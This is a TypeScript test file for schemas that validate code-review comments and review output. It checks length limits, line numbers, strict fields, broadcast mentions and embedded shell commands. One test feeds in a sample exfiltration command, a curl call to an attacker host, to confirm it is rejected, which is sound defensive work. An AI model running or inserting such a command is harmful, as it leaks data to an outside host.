import { describe, expect, it } from 'vitest';
import { InlineCommentSchema, ReviewOutputSchema } from './schemas.js';

const validComment = {
  path: 'src/auth.ts',
  line: 10,
  side: 'RIGHT' as const,
  body: 'Avoid logging secrets. Use a redaction layer instead.',
  severity: 'major' as const,
  suggestion: 'logger.info({ user: user.id });',
};

describe('InlineCommentSchema', () => {
  it('accepts a well-formed comment', () => {
    expect(InlineCommentSchema.safeParse(validComment).success).toBe(true);
  });

  it('accepts comment without suggestion', () => {
    const { suggestion: _, ...withoutSuggestion } = validComment;
    expect(InlineCommentSchema.safeParse(withoutSuggestion).success).toBe(true);
  });

  it('rejects null suggestion (must be omitted, not null)', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, suggestion: null }).success).toBe(
      false,
    );
  });

  it('rejects non-positive line number', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, line: 0 }).success).toBe(false);
    expect(InlineCommentSchema.safeParse({ ...validComment, line: -1 }).success).toBe(false);
  });

  it('rejects fractional line number', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, line: 1.5 }).success).toBe(false);
  });

  it('rejects line numbers above 1_000_000', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, line: 1_000_001 }).success).toBe(false);
  });

  it('rejects unknown side value', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, side: 'CENTER' }).success).toBe(false);
  });

  it('rejects unknown severity value', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, severity: 'blocker' }).success).toBe(
      false,
    );
  });

  it('rejects empty body', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, body: '' }).success).toBe(false);
  });

  it('rejects oversized body (>5000 chars)', () => {
    const huge = 'x'.repeat(5001);
    expect(InlineCommentSchema.safeParse({ ...validComment, body: huge }).success).toBe(false);
  });

  it('rejects path containing NUL byte', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, path: 'src/a\0.ts' }).success).toBe(
      false,
    );
  });

  it('rejects path > 500 chars', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, path: 'a'.repeat(501) }).success).toBe(
      false,
    );
  });

  it('rejects @everyone broadcast mention', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, body: 'Hey @everyone please look' }).success,
    ).toBe(false);
  });

  it('rejects @channel broadcast mention', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, body: 'Notify @channel about this' })
        .success,
    ).toBe(false);
  });

  it('rejects shell command (curl http) in body', () => {
    expect(
      InlineCommentSchema.safeParse({
        ...validComment,
        body: 'Run `curl http://attacker.example/leak`',
      }).success,
    ).toBe(false);
  });

  it('allows mentions of regular users', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, body: 'cc @alice — thoughts?' }).success,
    ).toBe(true);
  });

  it('allows curl mentioned without an HTTP URL', () => {
    expect(
      InlineCommentSchema.safeParse({
        ...validComment,
        body: 'Use curl to test this endpoint locally.',
      }).success,
    ).toBe(true);
  });

  it('rejects unknown extra fields (strict mode)', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, extra: 'oops' }).success).toBe(false);
  });

  it('rejects empty path', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, path: '' }).success).toBe(false);
  });

  it('rejects oversized suggestion (>5000 chars)', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, suggestion: 'x'.repeat(5001) }).success,
    ).toBe(false);
  });
});

describe('ReviewOutputSchema', () => {
  it('accepts valid output with empty comments', () => {
    expect(ReviewOutputSchema.safeParse({ summary: 'No issues.', comments: [] }).success).toBe(
      true,
    );
  });

  it('accepts valid output with multiple comments', () => {
    expect(
      ReviewOutputSchema.safeParse({
        summary: 'Two issues identified.',
        comments: [validComment, { ...validComment, line: 20 }],
      }).success,
    ).toBe(true);
  });

  it('rejects empty summary', () => {
    expect(ReviewOutputSchema.safeParse({ summary: '', comments: [] }).success).toBe(false);
  });

  it('rejects oversized summary (>10000 chars)', () => {
    expect(
      ReviewOutputSchema.safeParse({ summary: 'x'.repeat(10_001), comments: [] }).success,
    ).toBe(false);
  });

  it('rejects more than 50 comments', () => {
    const many = Array.from({ length: 51 }, (_, i) => ({ ...validComment, line: i + 1 }));
    expect(ReviewOutputSchema.safeParse({ summary: 'Too many', comments: many }).success).toBe(
      false,
    );
  });

  it('accepts exactly 50 comments', () => {
    const fifty = Array.from({ length: 50 }, (_, i) => ({ ...validComment, line: i + 1 }));
    expect(ReviewOutputSchema.safeParse({ summary: 'OK', comments: fifty }).success).toBe(true);
  });

  it('rejects unknown extra fields (strict mode)', () => {
    expect(
      ReviewOutputSchema.safeParse({ summary: 'ok', comments: [], extra: 'nope' }).success,
    ).toBe(false);
  });

  it('propagates per-comment validation failures', () => {
    expect(
      ReviewOutputSchema.safeParse({
        summary: 'ok',
        comments: [{ ...validComment, body: '@everyone' }],
      }).success,
    ).toBe(false);
  });
});
